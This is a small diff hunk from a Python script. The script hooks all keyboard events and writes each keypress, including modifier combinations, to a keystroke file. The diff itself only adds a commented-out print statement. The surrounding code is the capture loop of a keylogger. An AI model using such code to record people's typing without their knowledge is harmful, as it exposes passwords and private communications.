@@ -50,6 +50,7 @@ with open(keystroke_file, 'a', encoding='utf-8') as file:
         else:
             if e.event_type == "down":
                 keypressed = '+'.join(stack_modifier) + '+' + e.name if stack_modifier else e.name
+                # print(keypressed\)
                 file.write(f'{keypressed}\n')
 
     keyboard.hook(on_key_event)
